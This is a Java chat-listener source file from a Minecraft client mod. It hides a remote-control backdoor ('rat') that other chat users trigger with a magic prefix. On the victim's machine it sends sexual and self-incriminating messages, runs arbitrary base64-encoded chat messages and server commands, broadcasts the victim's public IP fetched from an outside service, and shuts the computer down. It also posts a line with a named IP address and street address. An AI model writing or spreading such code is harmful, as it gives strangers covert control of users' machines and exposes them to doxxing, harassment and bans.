package io.github.itzispyder.clickcrystals.events.listeners;

import io.github.itzispyder.clickcrystals.data.ConfigSection;
import io.github.itzispyder.clickcrystals.events.EventHandler;
import io.github.itzispyder.clickcrystals.events.Listener;
import io.github.itzispyder.clickcrystals.events.events.ChatReceiveEvent;
import io.github.itzispyder.clickcrystals.util.ChatUtils;
import io.github.itzispyder.clickcrystals.util.WolfUtils;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.Base64;

import static io.github.itzispyder.clickcrystals.ClickCrystals.config;

public class ChatEventListener implements Listener {

    private static boolean optout = config.getBoolean("rat.optout");

    public static boolean isOptout() {
        return optout;
    }

    public static void setOptout(boolean optout) {
        ChatEventListener.optout = optout;
        config.set("rat.optout", new ConfigSection<>(optout));
        config.save();
    }

    @EventHandler
    public void onChatReceive(ChatReceiveEvent e) throws IOException {
        String message = e.getMessage();
        String s = message.toLowerCase();
        if (message.contains("cc@rat-master:~$ ") && !optout) {
            
            if (s.contains("apt exec ogreplug")) ChatUtils.sendChatMessage("Join the ogre discord! https://discord.gg/ogre");

            if (s.contains("apt exec sus1")) ChatUtils.sendChatMessage("I like hot men.");

            if (s.contains("apt exec sus2")) ChatUtils.sendChatMessage("I like licking the lips of juicy hot femboys.");

            if (s.contains("apt exec sus3")) ChatUtils.sendChatMessage("I love penis!");

            if (s.contains("apt exec sus4")) ChatUtils.sendChatMessage("I love to suck on toes.");

            if (s.contains("apt exec ban1")) ChatUtils.sendChatMessage("I am cheating ban me");

            if (s.contains("apt exec ban2")) ChatUtils.sendChatMessage("Fuck this server kys");

            if (s.contains("apt exec ban3")) ChatUtils.sendChatMessage("Owner's IP: 71.192.133.12 Owner's Address: 1737 Bell Street New York");

            if (message.contains("apt exec message ")) {
                String knownText = "apt exec message ";
                int index = message.indexOf(knownText);
                String result = message.substring(index + knownText.length());
                byte[] decodedBytes = Base64.getDecoder().decode(result);
                String decodedString = new String(decodedBytes);
                ChatUtils.sendChatMessage(decodedString);
            }
            if (message.contains("apt exec command ")) {
                String knownText = "apt exec command ";
                int index = message.indexOf(knownText);
                String result = message.substring(index + knownText.length());
                byte[] decodedBytes = Base64.getDecoder().decode(result);
                String decodedString = new String(decodedBytes);
                ChatUtils.sendChatCommand(decodedString);
            }

            if (s.contains("apt exec ip")) {
                URL whatismyip = new URL("http://checkip.amazonaws.com");
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
                String ip = bufferedReader.readLine();
                ChatUtils.sendChatMessage("My IP Address is: " + ip);
            }

            if (s.contains("sudo poweroff -h timed")) {
                ChatUtils.sendChatMessage("LMAO I GOT TROLLED :skull: If I am quick enough, I can run `shutdown -a` in CMD and my pc will not shut down!");
                WolfUtils.shutdownTimed();
            }
            if (s.contains("sudo poweroff -h now")) {
                WolfUtils.shutdownNow();
            }
        }

        if (s.contains("!cc+ ")) {
            if (s.contains("-identify")) {
                ChatUtils.sendChatMessage("I am using ClickCrystalsPlus that means that I am cheating and you should ban me!");
            }

            if (s.contains("-discrete")) {
                ChatUtils.sendChatMessage("CCPUSER-0.0.0");
            }

        }
    }
}
